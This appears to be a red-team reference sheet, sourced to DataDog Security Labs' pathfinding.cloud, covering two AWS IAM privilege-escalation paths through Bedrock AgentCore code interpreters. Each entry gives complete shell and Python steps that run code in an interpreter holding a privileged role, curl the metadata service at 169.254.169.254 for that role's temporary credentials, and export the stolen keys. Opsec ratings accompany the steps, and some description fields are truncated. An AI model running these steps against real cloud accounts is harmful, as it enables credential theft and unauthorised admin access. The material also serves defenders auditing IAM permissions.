# Bedrock - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter [added: 2026-04]
- **Tags:** #Iam #BedrockAgentcore #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + bedrock-agentcore service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, bedrock-agentcore:CreateCodeInterpreter, bedrock-agentcore:StartCodeInterpreterSession, bedrock-agentcore:InvokeCodeInterpreter; A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [bedrock-001] A principal with `iam:PassRole`, `bedrock-agentcore:CreateCodeInterpreter`, `bedrock-agentcore:StartCodeInterpreterSession`, and `bedrock-agentcore:InvokeCodeInterpreter` can create and invoke an AWS Bedrock AgentCore code interpreter with a privileged IAM execution role. Code interpreters run on Firecracker MicroVMs and can access the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to
- **Payload/Method:**
```
# Step 1: Set up current session variables and confirm jq is installed
export AWS_REGION=[your region]
export EXECUTION_ROLE=[arn with admin privs]
export AWS_ACCESS_KEY_ID = [access key]
export AWS_SECRET_ACCESS_KEY = [secret access key]
export AWS_SESSION_TOKEN = [session token if applicable]
which jq

# Step 2: Create a code interpreter with the privileged execution role
INTERPRETER_ID=$(aws bedrock-agentcore-control create-code-interpreter \
  --name privesc \
  --network-configuration '{"networkMode":"SANDBOX"}' \
  --execution-role-arn $EXECUTION_ROLE | jq -r .codeInterpreterId)

# Step 3: Create the python file that will invoke the interpreter
cat << 'EOF' > "get_secrets_from_interpreter.py"
import boto3
import sys
bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
CODE_INTERPRETER_ID = sys.argv[1]

session = bedrock_agentcore_client.start_code_interpreter_session(
  codeInterpreterIdentifier=CODE_INTERPRETER_ID,
)
session_id = session['sessionId']

code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'

response = bedrock_agentcore_client.invoke_code_interpreter(
  codeInterpreterIdentifier=CODE_INTERPRETER_ID,
  sessionId=session_id,
  name='executeCommand',
  arguments={'command': code}
)

for event in response['stream']:
  if event['result']['structuredContent']['stdout']:
    print(event['result']['structuredContent']['stdout'])
EOF

# Step 4: Run the python file using the $INTERPRETER_ID to extract credentials
CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)
echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
echo export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r ".SecretAccessKey")
echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")

# Step 5: Use the stolen credentials to assume the privileged role's permissions
export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>
export AWS_SESSION_TOKEN=<Token from step 5>
aws sts get-caller-identity
```

### bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter [added: 2026-04]
- **Tags:** #BedrockAgentcore #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; bedrock-agentcore in scope
- **Prereq:** IAM perms: bedrock-agentcore:StartCodeInterpreterSession, bedrock-agentcore:InvokeCodeInterpreter; A Bedrock AgentCore code interpreter must exist with an IAM execution role attac
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [bedrock-002] A principal with `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter` can access an existing Bedrock AgentCore code interpreter that has a privileged IAM execution role attached. By starting a session and invoking arbitrary Python code within the interpreter, an attacker can access the MicroVM Metadata Service (MMDS) at 169.254.169.254 to retrieve temporary
- **Payload/Method:**
```
# Step 1: List existing code interpreters to find targets with privileged roles
aws bedrock-agentcore-control list-code-interpreters

# Step 2: Check the interpreter's execution role ARN to confirm elevated permissions
aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id INTERPRETER_ID

# Step 3: Create the python file that will invoke the existing interpreter
cat << 'EOF' > "get_secrets_from_interpreter.py"
import boto3
import sys
bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
CODE_INTERPRETER_ID = sys.argv[1]

session = bedrock_agentcore_client.start_code_interpreter_session(
  codeInterpreterIdentifier=CODE_INTERPRETER_ID,
)
session_id = session['sessionId']

code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'

response = bedrock_agentcore_client.invoke_code_interpreter(
  codeInterpreterIdentifier=CODE_INTERPRETER_ID,
  sessionId=session_id,
  name='executeCommand',
  arguments={'command': code}
)

for event in response['stream']:
  if event['result']['structuredContent']['stdout']:
    print(event['result']['structuredContent']['stdout'])
EOF

# Step 4: Run the python file using the $INTERPRETER_ID to extract credentials
CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)
echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
echo export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r ".SecretAccessKey")
echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")

# Step 5: Use the stolen credentials to assume the privileged role's permissions
export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>
export AWS_SESSION_TOKEN=<Token from step 5>
aws sts get-caller-identity
```
